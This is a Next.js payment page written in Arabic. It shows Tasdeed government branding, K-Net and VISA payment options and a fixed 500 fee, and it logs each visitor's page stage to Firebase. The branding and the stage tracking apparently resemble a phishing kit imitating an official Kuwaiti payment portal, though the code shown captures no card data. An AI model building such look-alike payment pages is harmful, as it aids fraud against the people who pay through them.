"use client"

import { useEffect, useState } from "react"
import { addData } from "@/lib/firebase"
import { PaymentCard } from "@/components/payment-card"
import { PaymentHeader } from "@/components/payment-header"
import { PaymentFooter } from "@/components/payment-footer"
import { Card, CardContent } from "@/components/ui/card"
import { Loader2 } from "lucide-react"
import { LogoSection } from "@/components/logo-section"

export default function PaymentPage() {
  const [serviceName, setServiceName] = useState<string>("")
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)

  useEffect(() => {
    try {
      const storedService = localStorage.getItem("selectedService")
      const visitorId = localStorage.getItem("visitor")

      if (storedService) {
        setServiceName(storedService)
      } else {
        setServiceName("الخدمة المطلوبة")
      }

      if (visitorId) {
        addData({ id: visitorId, page: "صفحة الدفع" })
      }
    } catch (err) {
      console.error("Error loading payment page:", err)
      setError("حدث خطأ في تحميل البيانات")
    } finally {
      setLoading(false)
    }
  }, [])

  const handlePayment = () => {
    // Add payment tracking
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      addData({ id: visitorId, page: "بدء عملية الدفع" })
    }
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Card className="p-8">
          <CardContent className="flex items-center space-x-4">
            <Loader2 className="w-6 h-6 animate-spin text-blue-600" />
            <span className="text-lg" dir="rtl">
              جاري التحميل...
            </span>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (error) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Card className="p-8 border-red-200 bg-red-50">
          <CardContent className="text-center">
            <p className="text-red-600 text-lg" dir="rtl">
              {error}
            </p>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex flex-col">
      <PaymentHeader />

      <main className="flex-1 container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto space-y-8">
          {/* Government Logos Section */}
          <div className="bg-white rounded-lg shadow-sm p-8">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-center">
          
              <LogoSection
                src="/TasdeedLogo.png"
                alt="Tasdeed Logo"
                width={250}
                height={80}
                className="order-1 md:order-2"
              />
            </div>
          </div>

          {/* Payment Card */}
          <PaymentCard serviceName={serviceName} amount="500" onPayment={handlePayment} />

          {/* Payment Methods */}
          <div className="bg-white rounded-lg shadow-sm p-6">
            <h3 className="text-lg font-semibold text-center mb-4" dir="rtl">
              وسائل الدفع المتاحة
            </h3>
            <div className="flex justify-center items-center space-x-6">
              <div className="flex items-center space-x-2">
                <img src="/next.svg" alt="K-Net Logo" width={60} height={40} className="object-contain" />
                <span className="text-sm text-gray-600" dir="rtl">
                  K-Net
                </span>
              </div>
              <div className="text-gray-400">|</div>
              <div className="flex items-center space-x-2">
                <div className="w-12 h-8 bg-gradient-to-r from-blue-600 to-purple-600 rounded flex items-center justify-center">
                  <span className="text-white text-xs font-bold">VISA</span>
                </div>
                <span className="text-sm text-gray-600" dir="rtl">
                  البطاقات المصرفية
                </span>
              </div>
            </div>
          </div>

          {/* Security Notice */}
          <div className="bg-green-50 border border-green-200 rounded-lg p-4">
            <p className="text-green-800 text-center text-sm" dir="rtl">
              🔒 جميع المعاملات المالية محمية بأعلى معايير الأمان والتشفير
            </p>
          </div>
        </div>
      </main>

      <PaymentFooter />
    </div>
  )
}
